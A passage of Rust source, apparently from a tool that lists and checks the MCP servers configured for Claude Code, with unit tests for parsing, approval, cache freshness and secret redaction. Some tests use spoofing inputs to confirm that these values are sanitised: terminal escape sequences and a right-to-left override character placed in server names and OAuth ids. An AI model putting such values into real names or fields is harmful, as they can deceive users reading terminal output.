                        return Err("the project is not a local absolute path".to_owned());
                    }
                    let path = Path::new(project).join(".mcp.json");
                    read_project_servers(&path)?
                        .map(|(servers, _)| servers)
                        .ok_or_else(|| format!("{} does not exist", display_path(&path)))
                });
                let servers = servers.as_ref().map_err(String::clone)?;
                return servers
                    .iter()
                    .find(|(n, _)| *n == key.name)
                    .map(|(_, v)| v.clone())
                    .ok_or_else(gone);
            }
            let root = root.as_ref().expect("read for every user and local server");
            let root = root.as_ref().map_err(String::clone)?;
            entry_in(root, key.project.as_deref(), &key.name).ok_or_else(gone)
        })
        .collect()
}

/// A user server (`project` is `None`) or local server's definition in the parsed `.claude.json`.
fn entry_in(root: &Value, project: Option<&str>, name: &str) -> Option<Value> {
    match project {
        None => root.get("mcpServers").and_then(|s| s.get(name)).cloned(),
        Some(project) => {
            let wanted = normalise_project(project);
            root.get("projects")
                .and_then(Value::as_object)
                .into_iter()
                .flatten()
                .filter(|(key, _)| normalise_project(key) == wanted)
                .find_map(|(_, entry)| entry.get("mcpServers").and_then(|s| s.get(name)).cloned())
        }
    }
}

/// The definition of one server in a project's `.mcp.json`, as Claude Code would read it (a later duplicate wins).
pub(crate) fn project_server(project: &str, name: &str) -> Result<Value, String> {
    if !is_safe_project_path(project) {
        return Err("the project is not a local absolute path".to_owned());
    }
    let path = Path::new(project).join(".mcp.json");
    let (servers, _) = read_project_servers(&path)?
        .ok_or_else(|| format!("{} does not exist", display_path(&path)))?;
    servers
        .into_iter()
        .find(|(n, _)| n == name)
        .map(|(_, v)| v)
        .ok_or_else(|| format!("{} no longer defines that server", display_path(&path)))
}

/// The servers in a project's `.mcp.json`, by name, in file order.
type ProjectServerList = Vec<(String, Value)>;

/// Names of servers in a project's `.mcp.json`, plus each name defined more than once.
type ProjectServers = (Vec<(String, Value)>, Vec<String>);

pub(crate) fn read_project_servers(path: &Path) -> Result<Option<ProjectServers>, String> {
    let Some(text) = fsx::read_limited(path, MAX_MCP_JSON).map_err(|e| e.to_string())? else {
        return Ok(None);
    };
    #[derive(Deserialize)]
    struct McpFile {
        #[serde(rename = "mcpServers", default)]
        servers: Option<Pairs>,
    }
    let file: McpFile = serde_json::from_str(&text).map_err(|e| format!("invalid JSON ({e})"))?;
    Ok(Some(
        file.servers
            .map(|p| (p.entries, p.duplicates))
            .unwrap_or_default(),
    ))
}

/// A JSON object read as ordered pairs, so duplicate keys are noticed and the count is capped.
struct Pairs {
    entries: Vec<(String, Value)>,
    duplicates: Vec<String>,
}

impl<'de> Deserialize<'de> for Pairs {
    fn deserialize<D: serde::Deserializer<'de>>(d: D) -> Result<Self, D::Error> {
        struct V;
        impl<'de> Visitor<'de> for V {
            type Value = Pairs;
            fn expecting(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
                f.write_str("an object of servers")
            }
            fn visit_map<A: MapAccess<'de>>(self, mut map: A) -> Result<Pairs, A::Error> {
                let mut entries: Vec<(String, Value)> = Vec::new();
                // Where each name is in `entries`, and whether it was repeated: a file from a repository may repeat
                // names many thousands of times.
                let mut index: HashMap<String, (usize, bool)> = HashMap::new();
                let mut duplicates = Vec::new();
                while let Some((k, v)) = map.next_entry::<String, Value>()? {
                    if let Some((i, repeated)) = index.get_mut(&k) {
                        entries[*i].1 = v;
                        // Once per name: at most one per entry, however often it repeats.
                        if !std::mem::replace(repeated, true) {
                            duplicates.push(k);
                        }
                    } else if entries.len() >= MAX_MCP_SERVERS {
                        return Err(A::Error::custom(format!(
                            "more than {MAX_MCP_SERVERS} servers"
                        )));
                    } else {
                        index.insert(k.clone(), (entries.len(), false));
                        entries.push((k, v));
                    }
                }
                Ok(Pairs {
                    entries,
                    duplicates,
                })
            }
        }
        d.deserialize_map(V)
    }
}

// ---------------------------------------------------------------- approval

/// Who has said yes or no to a project server. Claude keeps this in the project entry of `.claude.json` and,
/// in current versions, in the project's own `.claude/settings.local.json`; both are read (decision 002).
struct ApprovalLists {
    enabled: BTreeSet<String>,
    rejected: BTreeSet<String>,
    all: bool,
}

impl ApprovalLists {
    fn load(project: &Project<'_>, warnings: &mut Vec<String>) -> Self {
        let mut lists = Self {
            enabled: BTreeSet::new(),
            rejected: BTreeSet::new(),
            all: false,
        };
        for value in &project.values {
            lists.absorb(value);
        }
        let path = Path::new(&project.raw)
            .join(".claude")
            .join("settings.local.json");
        match read_json(&path, MAX_MCP_JSON) {
            Ok(Some(value)) => lists.absorb(&value),
            Ok(None) => {}
            Err(e) => warnings.push(format!("Ignored {}: {e}", display_path(&path))),
        }
        lists
    }

    fn absorb(&mut self, source: &Value) {
        self.enabled.extend(string_set(std::iter::once(
            source.get("enabledMcpjsonServers"),
        )));
        self.rejected.extend(string_set(std::iter::once(
            source.get("disabledMcpjsonServers"),
        )));
        self.all |= source.get("enableAllProjectMcpServers") == Some(&Value::Bool(true));
    }

    fn of(&self, name: &str) -> Approval {
        if self.rejected.contains(name) {
            Approval::Rejected
        } else if self.all || self.enabled.contains(name) {
            Approval::Approved
        } else {
            Approval::Pending
        }
    }
}

// ---------------------------------------------------------------- hints

/// Instant status hints from Claude's own caches. Only a hint; live checks come later.
///
/// Claude Code 2.1.302 no longer writes `mcp-health-cache.json`: what is in it was left by an older version and can
/// be any age, so it is only ever a last-known status. `mcp-needs-auth-cache.json` is still written, with a time per
/// entry; Claude trusts an entry for its `ttlMs` (15 minutes by default) and ignores it after, and so does klefki.
struct Hints {
    health: BTreeMap<String, String>,
    needs_auth: BTreeMap<String, Freshness>,
}

#[derive(Clone, Copy, PartialEq, Eq, Debug)]
enum Freshness {
    /// Written by Claude within its time to live: as good as a check.
    Fresh,
    /// No time recorded (an older format): a last-known status.
    Undated,
}

/// How long Claude Code trusts a needs-auth entry without its own `ttlMs` (2.1.302: 15 minutes).
const NEEDS_AUTH_TTL_MS: f64 = 15.0 * 60.0 * 1000.0;
/// The longest time to live Claude Code gives an entry itself (4 hours, for claude.ai and plugin servers). An
/// entry's own `ttlMs` comes from a file anyone could have written, so it is held to this.
const NEEDS_AUTH_MAX_TTL_MS: f64 = 4.0 * 60.0 * 60.0 * 1000.0;
/// How far in the future an entry's time may be, for clocks that disagree (Claude allows a minute too).
const CLOCK_SKEW_MS: f64 = 60.0 * 1000.0;

impl Hints {
    fn load(paths: &ConfigPaths, warnings: &mut Vec<String>) -> Self {
        let mut hints = Self {
            health: BTreeMap::new(),
            needs_auth: BTreeMap::new(),
        };
        let health = paths.claude_dir.join("mcp-health-cache.json");
        match read_json(&health, MAX_CACHE_JSON) {
            Ok(Some(v)) => {
                if let Some(servers) = v.get("servers").and_then(Value::as_object) {
                    for (name, e) in servers {
                        if let Some(s) = e.get("status").and_then(Value::as_str) {
                            hints.health.insert(name.clone(), s.to_owned());
                        }
                    }
                }
            }
            Ok(None) => {}
            Err(e) => warnings.push(format!("Ignored {}: {e}", display_path(&health))),
        }
        let needs = paths.claude_dir.join("mcp-needs-auth-cache.json");
        match read_json(&needs, MAX_CACHE_JSON) {
            Ok(Some(Value::Object(o))) => {
                let now = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .map_or(0.0, |d| d.as_millis() as f64);
                for (name, entry) in o {
                    if let Some(freshness) = needs_auth_freshness(&entry, now) {
                        hints.needs_auth.insert(name, freshness);
                    }
                }
            }
            Ok(_) => {}
            Err(e) => warnings.push(format!("Ignored {}: {e}", display_path(&needs))),
        }
        hints
    }

    /// The status the caches give `name`, and whether it is only a last-known one (to be checked again).
    fn status_of(&self, name: &str) -> (Status, bool) {
        match self.needs_auth.get(name) {
            Some(Freshness::Fresh) => return (Status::NeedsAuth, false),
            Some(Freshness::Undated) => return (Status::NeedsAuth, true),
            None => {}
        }
        match self.health.get(name).map(String::as_str) {
            Some("healthy") => (Status::Connected, true),
            Some(_) => (Status::Failed, true),
            None => (Status::Unknown, false),
        }
    }
}

/// What a needs-auth entry is worth at `now` (milliseconds since 1970): `None` once Claude itself would ignore it.
fn needs_auth_freshness(entry: &Value, now: f64) -> Option<Freshness> {
    let Some(at) = entry.get("timestamp").and_then(Value::as_f64) else {
        return Some(Freshness::Undated);
    };
    let ttl = entry
        .get("ttlMs")
        .and_then(Value::as_f64)
        .filter(|t| t.is_finite() && *t > 0.0)
        .map_or(NEEDS_AUTH_TTL_MS, |t| t.min(NEEDS_AUTH_MAX_TTL_MS));
    let age = now - at;
    (age > -CLOCK_SKEW_MS && age < ttl).then_some(Freshness::Fresh)
}

// ---------------------------------------------------------------- reading .claude.json

/// The keys the inventory reads, at the top of `.claude.json` and in each project entry.
const ENTRY_KEYS: &[&str] = &[
    "mcpServers",
    "disabledMcpServers",
    LEGACY,
    "enabledMcpjsonServers",
    "disabledMcpjsonServers",
    "enableAllProjectMcpServers",
];

/// Parses `.claude.json` keeping only what the inventory uses: `mcpServers`, and in `projects` the entries' server
/// lists. Everything else (chat history, caches, tips) is checked as JSON but skipped while parsing, not built into a
/// tree, which matters for files of tens of megabytes. A root that is not an object comes back as `Null`.
#[cfg(test)]
fn read_claude_json(path: &Path) -> Result<Option<Value>, String> {
    fsx::read_limited(path, MAX_CLAUDE_JSON)
        .map_err(|e| e.to_string())?
        .map(|text| parse_claude_json(&text))
        .transpose()
}

fn parse_claude_json(text: &str) -> Result<Value, String> {
    let mut de = serde_json::Deserializer::from_str(text);
    serde::de::DeserializeSeed::deserialize(Level::Root, &mut de)
        .and_then(|v| de.end().map(|()| v))
        .map_err(|e| format!("invalid JSON ({e})"))
}

/// Where in `.claude.json` a value sits, which decides what of it is kept.
#[derive(Clone, Copy)]
enum Level {
    Root,
    Projects,
    Entry,
}

impl<'de> serde::de::DeserializeSeed<'de> for Level {
    type Value = Value;
    fn deserialize<D: serde::Deserializer<'de>>(self, d: D) -> Result<Value, D::Error> {
        d.deserialize_any(self)
    }
}

impl<'de> Visitor<'de> for Level {
    type Value = Value;

    fn expecting(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str("JSON")
    }

    fn visit_map<A: MapAccess<'de>>(self, mut map: A) -> Result<Value, A::Error> {
        let mut out = serde_json::Map::new();
        while let Some(key) = map.next_key::<String>()? {
            let kept = match (self, key.as_str()) {
                (Level::Root, "mcpServers") => Some(map.next_value::<Value>()?),
                (Level::Root, "projects") => Some(map.next_value_seed(Level::Projects)?),
                (Level::Projects, _) => Some(map.next_value_seed(Level::Entry)?),
                (Level::Entry, k) if ENTRY_KEYS.contains(&k) => Some(map.next_value::<Value>()?),
                _ => {
                    map.next_value::<serde::de::IgnoredAny>()?;
                    None
                }
            };
            if let Some(value) = kept {
                // Like a full parse: a later duplicate replaces the earlier value.
                out.insert(key, value);
            }
        }
        Ok(Value::Object(out))
    }

    // Anything that is not an object is skipped; the inventory treats `Null` as "not an object".
    fn visit_seq<A: serde::de::SeqAccess<'de>>(self, mut seq: A) -> Result<Value, A::Error> {
        while seq.next_element::<serde::de::IgnoredAny>()?.is_some() {}
        Ok(Value::Null)
    }
    fn visit_bool<E: serde::de::Error>(self, _: bool) -> Result<Value, E> {
        Ok(Value::Null)
    }
    fn visit_i64<E: serde::de::Error>(self, _: i64) -> Result<Value, E> {
        Ok(Value::Null)
    }
    fn visit_u64<E: serde::de::Error>(self, _: u64) -> Result<Value, E> {
        Ok(Value::Null)
    }
    fn visit_f64<E: serde::de::Error>(self, _: f64) -> Result<Value, E> {
        Ok(Value::Null)
    }
    fn visit_str<E: serde::de::Error>(self, _: &str) -> Result<Value, E> {
        Ok(Value::Null)
    }
    fn visit_unit<E: serde::de::Error>(self) -> Result<Value, E> {
        Ok(Value::Null)
    }
}

// ---------------------------------------------------------------- helpers

fn read_json(path: &Path, max: u64) -> Result<Option<Value>, String> {
    let Some(text) = fsx::read_limited(path, max).map_err(|e| e.to_string())? else {
        return Ok(None);
    };
    serde_json::from_str(&text)
        .map(Some)
        .map_err(|e| format!("invalid JSON ({e})"))
}

fn string_set<'a>(values: impl Iterator<Item = Option<&'a Value>>) -> BTreeSet<String> {
    values
        .flatten()
        .filter_map(Value::as_array)
        .flatten()
        .filter_map(Value::as_str)
        .map(str::to_owned)
        .collect()
}

fn display_path(path: &Path) -> String {
    sanitize(&path.display().to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_project_key_is_the_normalised_path_and_borrows_when_it_is_already_that() {
        for path in [
            "/",
            "/a",
            "/a/",
            "/a//",
            "C:/",
            "c:/",
            "C:",
            "c:",
            "c:\\",
            "C:\\x\\",
            "c:/x/",
            "C:/x",
            "\\\\nas\\s",
            "/home/u/proj",
            "d:/Repos",
            "D:/Repos",
            "x",
            "",
            "/a:/",
            "1:/x",
            "é:/x",
            "/ü/",
            "ä",
        ] {
            let key = project_key(path);
            assert_eq!(key, normalise_project(path), "{path:?}");
            assert_eq!(
                matches!(key, std::borrow::Cow::Borrowed(_)),
                normalise_project(path) == path,
                "{path:?}"
            );
        }
    }
    use serde_json::json;
    use std::path::PathBuf;

    struct Env {
        dir: tempfile::TempDir,
    }

    impl Env {
        fn new() -> Self {
            Self {
                dir: tempfile::tempdir().unwrap(),
            }
        }
        fn paths(&self) -> ConfigPaths {
            let mut paths = ConfigPaths::in_dir(self.dir.path());
            // The organisation's folder, empty unless a test writes `org/…`.
            paths.managed_dir = Some(self.dir.path().join("org"));
            paths
        }
        fn write(&self, rel: &str, v: &Value) {
            self.write_raw(rel, &serde_json::to_string(v).unwrap());
        }
        fn write_raw(&self, rel: &str, text: &str) {
            let p = self.dir.path().join(rel);
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            std::fs::write(p, text).unwrap();
        }
        fn project(&self, name: &str) -> PathBuf {
            let p = self.dir.path().join("projects").join(name);
            std::fs::create_dir_all(&p).unwrap();
            p
        }
        fn load(&self) -> Snapshot {
            load(&self.paths()).snapshot
        }
    }

    fn find<'a>(s: &'a Snapshot, scope: Scope, name: &str) -> &'a ServerRow {
        s.servers
            .iter()
            .find(|r| r.scope == scope && r.name == name)
            .unwrap_or_else(|| panic!("{scope:?}/{name} in {:#?}", s.servers))
    }

    #[test]
    fn lists_user_servers_of_every_transport() {
        let e = Env::new();
        e.write(
            ".claude.json",
            &json!({"mcpServers": {
                "REMOTE_1": {"type": "http", "url": "https://acme.example.com/gateway/mcp",
                             "oauth": {"clientId": "abc", "callbackPort": 1234}},
                "tool": {"type": "stdio", "command": "npx", "args": ["-y", "pkg"], "env": {"K": "v"}},
                "legacy": {"type": "sse", "url": "http://localhost:8080/sse"},
                "sock": {"type": "ws", "url": "wss://x.example.com/ws"},
                "implicit": {"command": "node"}
            }}),
        );
        let s = e.load();
        assert!(s.warnings.is_empty(), "{:?}", s.warnings);
        let sf = find(&s, Scope::User, "REMOTE_1");
        assert_eq!(sf.transport, TransportKind::Http);
        assert_eq!(sf.target, "https://acme.example.com/gateway/mcp");
        assert_eq!(find(&s, Scope::User, "tool").target, "npx -y pkg");
        assert_eq!(
            find(&s, Scope::User, "legacy").transport,
            TransportKind::Sse
        );
        assert_eq!(find(&s, Scope::User, "sock").transport, TransportKind::Ws);
        assert_eq!(
            find(&s, Scope::User, "implicit").transport,
            TransportKind::Stdio
        );
        assert!(s.servers.iter().all(|r| r.enabled));
    }

    #[test]
    fn secrets_never_reach_the_rows() {
        let e = Env::new();
        e.write(
            ".claude.json",
            &json!({"mcpServers": {
                "a": {"type": "http", "url": "https://user:pw-S3CRET@h.example.com/p?token=S3CRET#S3CRET",
                      "headers": {"Authorization": "Bearer S3CRET"},
                      "oauth": {"clientId": "client-1", "clientSecret": "S3CRET"}},
                "b": {"type": "stdio", "command": "x", "env": {"API_KEY": "S3CRET"}}
            }}),
        );
        let s = e.load();
        let dump = format!("{s:?}");
        assert!(!dump.contains("S3CRET"), "{dump}");
        // Changed with the owner's decision: an OAuth client id
        // is not a secret and is kept on the row. Anything else under `oauth` still is not.
        assert!(dump.contains("client-1"), "{dump}");
        assert_eq!(
            find(&s, Scope::User, "a").target,
            "https://h.example.com/p?…"
        );
    }

    #[test]
    fn status_comes_from_claudes_caches() {
        let e = Env::new();
        e.write(
            ".claude.json",
            &json!({"mcpServers": {
                "ok": {"type":"http","url":"https://a.example.com"},
                "bad": {"type":"http","url":"https://b.example.com"},
                "auth": {"type":"http","url":"https://c.example.com"},
                "new": {"type":"http","url":"https://d.example.com"}
            }}),
        );
        e.write(
            "mcp-health-cache.json",
            &json!({"version":1,"servers":{
                "ok":{"status":"healthy"},"bad":{"status":"unhealthy"},"auth":{"status":"healthy"}}}),
        );
        e.write(
            "mcp-needs-auth-cache.json",
            // Written just now, as Claude Code writes it: within its time to live. (Was `"timestamp":1`, 1970, which
            // Claude Code itself ignores.)
            &json!({"auth":{"timestamp":now_ms(),"id":"x"}}),
        );
        let s = e.load();
        assert_eq!(find(&s, Scope::User, "ok").status, Status::Connected);
        assert_eq!(find(&s, Scope::User, "bad").status, Status::Failed);
        assert_eq!(find(&s, Scope::User, "auth").status, Status::NeedsAuth);
        assert_eq!(find(&s, Scope::User, "new").status, Status::Unknown);
        // The health cache is left by older Claude Code versions and can be any age: last known only.
        assert!(find(&s, Scope::User, "ok").status_cached);
        assert!(find(&s, Scope::User, "bad").status_cached);
        // A needs-auth entry Claude wrote within its time to live is as good as a check.
        assert!(!find(&s, Scope::User, "auth").status_cached);
        assert!(!find(&s, Scope::User, "new").status_cached);
    }

    fn now_ms() -> u64 {
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_millis() as u64
    }

    #[test]
    fn a_needs_auth_entry_counts_only_as_long_as_claude_trusts_it() {
        let e = Env::new();
        let servers: serde_json::Map<String, Value> = [
            "fresh",
            "own-ttl",
            "expired",
            "own-ttl-gone",
            "future",
            "undated",
            "junk-time",
            "huge-ttl",
            "negative-ttl",
        ]
        .iter()
        .map(|n| {
            (
                (*n).to_owned(),
                json!({"type":"http","url":"https://a.example.com"}),
            )
        })
        .collect();
        e.write(".claude.json", &json!({ "mcpServers": servers }));
        e.write(
            "mcp-health-cache.json",
            &json!({"version":1,"servers":{"expired":{"status":"healthy"}}}),
        );
        let now = now_ms();
        let min = 60 * 1000;
        e.write(
            "mcp-needs-auth-cache.json",
            &json!({
                "fresh": {"timestamp": now - 14 * min},
                "own-ttl": {"timestamp": now - 3 * 60 * min, "ttlMs": 4 * 60 * min},
                "expired": {"timestamp": now - 16 * min},
                "own-ttl-gone": {"timestamp": now - 2 * min, "ttlMs": min},
                "future": {"timestamp": now + 5 * min},
                "undated": {},
                "junk-time": {"timestamp": "yesterday"},
                // From an untrusted file: a time to live of ages would make the entry fresh for ever.
                "huge-ttl": {"timestamp": now - 5 * 60 * min, "ttlMs": 1e300},
                "negative-ttl": {"timestamp": now - min, "ttlMs": -5}
            }),
        );
        let s = e.load();
        let got = |n: &str| {
            let r = find(&s, Scope::User, n);
            (r.status, r.status_cached)
        };
        assert_eq!(got("fresh"), (Status::NeedsAuth, false));
        assert_eq!(got("own-ttl"), (Status::NeedsAuth, false));
        // Past its time Claude ignores the entry; what is left is the health cache's last-known answer.
        assert_eq!(got("expired"), (Status::Connected, true));
        assert_eq!(got("own-ttl-gone"), (Status::Unknown, false));
        // A time too far ahead is a broken clock or a broken file: not trusted.
        assert_eq!(got("future"), (Status::Unknown, false));
        // No usable time: shown, but only as last known.
        assert_eq!(got("undated"), (Status::NeedsAuth, true));
        assert_eq!(got("junk-time"), (Status::NeedsAuth, true));
        // At most Claude's longest default (4 hours); a nonsense one counts as no time to live of its own.
        assert_eq!(got("huge-ttl"), (Status::Unknown, false));
        assert_eq!(got("negative-ttl"), (Status::NeedsAuth, false));
    }

    #[test]
    fn local_servers_and_disabled_state() {
        let e = Env::new();
        let p = e.project("app");
        e.write(
            ".claude.json",
            &json!({"projects": {p.to_string_lossy(): {
                "mcpServers": {"on": {"type":"http","url":"https://a.example.com"},
                               "off": {"type":"http","url":"https://b.example.com"}},
                "disabledMcpServers": ["off"]
            }}}),
        );
        let s = e.load();
        assert!(find(&s, Scope::Local, "on").enabled);
        assert!(!find(&s, Scope::Local, "off").enabled);
        assert_eq!(
            find(&s, Scope::Local, "on").project.as_deref(),
            Some(normalise_project(&p.to_string_lossy()).as_str())
        );
    }

    #[test]
    fn each_row_knows_its_connection_id_from_the_keys_on_disk() {
        // Shown names and paths are cleaned for display; the id is made from what the file says, like v1's.
        let e = Env::new();
        let p = e.project("app");
        std::fs::write(
            p.join(".mcp.json"),
            r#"{"mcpServers":{"docs":{"command":"node"}}}"#,
        )
        .unwrap();
        let spelled = format!("{}\\", p.to_string_lossy());
        e.write(
            ".claude.json",
            &json!({
                "mcpServers": {"gh\u{1b}[2Jub": {"command": "x"}},
                "projects": {
                    p.to_string_lossy(): {},
                    spelled.clone(): {"mcpServers": {"loc": {"command": "y"}}}
                }
            }),
        );
        let s = e.load();
        let user = s.servers.iter().find(|r| r.scope == Scope::User).unwrap();
        assert_ne!(user.name, "gh\u{1b}[2Jub", "shown cleaned");
        assert_eq!(
            user.connection,
            ConnectionId::new(Scope::User, None, "gh\u{1b}[2Jub")
        );
        assert_eq!(
            find(&s, Scope::Local, "loc").connection,
            ConnectionId::new(Scope::Local, Some(&spelled), "loc")
        );
        let docs = find(&s, Scope::Project, "docs");
        assert_eq!(
            ConnectionId::parse(docs.connection.as_str()).unwrap().2,
            "docs"
        );
    }

    #[test]
    fn oauth_client_ids_and_scopes_are_kept_on_the_rows() {
        let e = Env::new();
        let p = e.project("app");
        std::fs::write(
            p.join(".mcp.json"),
            format!(
                r#"{{"mcpServers":{{"repo":{{"type":"http","url":"https://r.example.com",
                    "oauth":{{"clientId":"evil\u001b[31mid","scopes":["{}"]}}}}}}}}"#,
                "s".repeat(600)
            ),
        )
        .unwrap();
        e.write(
            ".claude.json",
            &json!({
                "mcpServers": {
                    "listed": {"type": "http", "url": "https://a.example.com",
                               "oauth": {"clientId": "abc", "callbackPort": 1234, "scopes": ["read", "write"]}},
                    "spaced": {"type": "http", "url": "https://b.example.com",
                               "oauth": {"clientId": "def", "scopes": "read  write admin"}},
                    "dynamic": {"type": "http", "url": "https://c.example.com", "oauth": {"callbackPort": 9}},
                    "odd": {"type": "http", "url": "https://d.example.com", "oauth": {"clientId": 7, "scopes": [1, "x"]}},
                    "plain": {"type": "http", "url": "https://e.example.com"}
                },
                "projects": {p.to_string_lossy(): {}}
            }),
        );
        let s = e.load();
        let oauth = |scope, name| find(&s, scope, name).oauth.clone();
        assert_eq!(
            oauth(Scope::User, "listed"),
            Some(OAuthInfo {
                client_id: Some("abc".into()),
                scopes: vec!["read".into(), "write".into()]
            })
        );
        assert_eq!(
            oauth(Scope::User, "spaced").unwrap().scopes,
            ["read", "write", "admin"]
        );
        // Signs in with OAuth, the client registered on the fly: no id, still OAuth.
        assert_eq!(
            oauth(Scope::User, "dynamic"),
            Some(OAuthInfo {
                client_id: None,
                scopes: Vec::new()
            })
        );
        // Values of the wrong kind are left out, not guessed.
        assert_eq!(
            oauth(Scope::User, "odd"),
            Some(OAuthInfo {
                client_id: None,
                scopes: vec!["x".into()]
            })
        );
        assert_eq!(oauth(Scope::User, "plain"), None);
        // From a repository: untrusted, so cleaned and cut like every other text.
        let repo = oauth(Scope::Project, "repo").unwrap();
        let id = repo.client_id.unwrap();
        assert!(id.starts_with("evil") && !id.contains('\u{1b}'), "{id:?}");
        // Cut at 512 characters, marked with an ellipsis.
        assert_eq!(repo.scopes[0].chars().count(), 513);
        assert!(repo.scopes[0].ends_with('…'));
    }

    #[test]
    fn a_look_alike_name_does_not_shadow() {
        // A local server shown as "ab" but spelled with a hidden character is another name to Claude Code.
        let e = Env::new();
        let p = e.project("app");
        std::fs::write(
            p.join(".mcp.json"),
            r#"{"mcpServers":{"ab":{"command":"node"},"cd":{"command":"node"}}}"#,
        )
        .unwrap();
        e.write(
            ".claude.json",
            &json!({"projects": {p.to_string_lossy(): {
                "mcpServers": {"a\u{202e}b": {"command": "x"}, "cd": {"command": "y"}}
            }}}),
        );
        let s = e.load();
        assert!(!find(&s, Scope::Project, "ab").shadowed);
        assert!(
            find(&s, Scope::Project, "cd").shadowed,
            "a real match still does"
        );
    }

    #[test]
    fn project_servers_come_from_mcp_json_and_can_be_shadowed() {
        let e = Env::new();
        let p = e.project("app");
        std::fs::write(
            p.join(".mcp.json"),
            r#"{"mcpServers":{"shared":{"type":"http","url":"https://s.example.com"},
                "docs":{"command":"node","args":["docs.js"]}}}"#,
        )
        .unwrap();
        e.write(
            ".claude.json",
            &json!({"projects": {p.to_string_lossy(): {
                "mcpServers": {"shared": {"type":"http","url":"https://mine.example.com"}}
            }}}),
        );
        let s = e.load();
        assert!(find(&s, Scope::Project, "shared").shadowed);
        assert!(!find(&s, Scope::Local, "shared").shadowed);
        assert!(!find(&s, Scope::Project, "docs").shadowed);
    }

    #[test]
    fn a_user_server_is_shadowed_where_a_local_or_approved_project_server_has_its_name() {
        // Claude Code loads user < approved project < local; a project server waiting for approval or rejected
        // is not loaded, so it hides nothing. Names compare as the file spells them.
        let e = Env::new();
        let (a, b, c) = (e.project("a"), e.project("b"), e.project("c"));
        std::fs::write(
            b.join(".mcp.json"),
            r#"{"mcpServers":{"gh":{"command":"node"},"docs":{"command":"node"},"solo":{"command":"node"}}}"#,
        )
        .unwrap();
        e.write(
            ".claude.json",
            &json!({
                "mcpServers": {
                    "gh": {"command": "gh"}, "docs": {"command": "d"},
                    "solo": {"command": "s"}, "free": {"command": "f"}
                },
                "projects": {
                    a.to_string_lossy(): {"mcpServers": {"gh": {"command": "mine"}}},
                    b.to_string_lossy(): {
                        "mcpServers": {"gh": {"command": "mine too"}},
                        "enabledMcpjsonServers": ["gh"], "disabledMcpjsonServers": ["solo"]
                    },
                    c.to_string_lossy(): {"mcpServers": {"GH": {"command": "other case"}}}
                }
            }),
        );
        let s = e.load();
        // The projects as their rows show them, in the inventory's order: a, then b.
        let shown: Vec<String> = s
            .servers
            .iter()
            .filter(|r| r.scope == Scope::Local && r.name == "gh")
            .filter_map(|r| r.project.clone())
            .collect();
        let gh = find(&s, Scope::User, "gh");
        // In b both a local and an approved project server hide it: one project, listed once.
        assert_eq!(gh.shadowed_in, shown);
        assert_eq!(shown.len(), 2);
        assert!(!gh.shadowed, "still used in c, so not hidden everywhere");
        for name in ["docs", "solo", "free"] {
            let r = find(&s, Scope::User, name);
            assert!(
                r.shadowed_in.is_empty() && !r.shadowed,
                "{name}: {:?}",
                r.shadowed_in
            );
        }
        // Rows of the other scopes keep their own meaning and list nothing.
        assert!(
            s.servers
                .iter()
                .filter(|r| r.scope != Scope::User)
                .all(|r| r.shadowed_in.is_empty())
        );
    }

    #[test]
    fn a_project_where_the_name_is_off_hides_nothing() {
        // The toggle goes by name: where `gh` is off, neither the user server nor the closer one runs, so nothing
        // is used instead of the user server there (cross-review of #21).
        let e = Env::new();
        let (a, b, c) = (e.project("a"), e.project("b"), e.project("c"));
        std::fs::write(
            b.join(".mcp.json"),
            r#"{"mcpServers":{"gh":{"command":"node"}}}"#,
        )
        .unwrap();
        e.write(
            ".claude.json",
            &json!({
                "mcpServers": {"gh": {"command": "gh"}},
                "projects": {
                    a.to_string_lossy(): {"mcpServers": {"gh": {"command": "mine"}}, "disabledMcpServers": ["gh"]},
                    b.to_string_lossy(): {"enableAllProjectMcpServers": true, "disabledMcpServers": ["gh"]},
                    c.to_string_lossy(): {}
                }
            }),
        );
        let s = e.load();
        let gh = find(&s, Scope::User, "gh");
        assert_eq!(gh.disabled_in, 2);
        assert!(gh.shadowed_in.is_empty(), "{:?}", gh.shadowed_in);
        assert!(!gh.shadowed);
    }

    #[test]
    fn a_user_server_hidden_in_every_known_project_is_shadowed() {
        let e = Env::new();
        let (a, b) = (e.project("a"), e.project("b"));
        std::fs::write(
            b.join(".mcp.json"),
            r#"{"mcpServers":{"gh":{"command":"node"}}}"#,
        )
        .unwrap();
        e.write(
            ".claude.json",
            &json!({
                "mcpServers": {"gh": {"command": "gh"}},
                "projects": {
                    a.to_string_lossy(): {"mcpServers": {"gh": {"command": "mine"}}},
                    b.to_string_lossy(): {"enableAllProjectMcpServers": true}
                }
            }),
        );
        let s = e.load();
        let gh = find(&s, Scope::User, "gh");
        assert!(gh.shadowed);
        assert_eq!(gh.shadowed_in.len(), 2);
        // A project server is still hidden only by a local one, never by the user server it hides.
        assert!(!find(&s, Scope::Project, "gh").shadowed);
    }

    #[test]
    fn rows_name_the_relative_paths_of_their_command() {
        let e = Env::new();
        let p = e.project("rel");
        std::fs::write(
            p.join(".mcp.json"),
            r#"{"mcpServers":{"repo":{"command":"node","args":["tools/mcp.js"]}}}"#,
        )
        .unwrap();
        e.write(
            ".claude.json",
            &json!({
                "mcpServers": {
                    "rel": {"command": "node", "args": ["build/index.js"], "env": {"CFG": "./c.json"}},
                    "abs": {"command": "node", "args": ["/opt/x/index.js"]},
                    "web": {"type": "http", "url": "https://x.example.com/a.js"}
                },
                "projects": {p.to_string_lossy(): {"mcpServers": {"mine": {"command": "./run.sh"}}}}
            }),
        );
        let s = e.load();
        assert_eq!(
            find(&s, Scope::User, "rel").relative_paths,
            ["build/index.js", "./c.json (in CFG)"]
        );
        assert!(find(&s, Scope::User, "abs").relative_paths.is_empty());
        assert!(find(&s, Scope::User, "web").relative_paths.is_empty());
        // Found for every stdio row; whether it matters depends on the scope, which is for the reader to say.
        assert_eq!(find(&s, Scope::Local, "mine").relative_paths, ["./run.sh"]);
        assert_eq!(
            find(&s, Scope::Project, "repo").relative_paths,
            ["tools/mcp.js"]
        );
    }

    #[test]
    fn duplicate_keys_in_mcp_json_are_reported_and_last_wins() {
        let e = Env::new();
        let p = e.project("dup");
        std::fs::write(
            p.join(".mcp.json"),
            r#"{"mcpServers":{"a":{"command":"first"},"a":{"command":"second"}}}"#,
        )
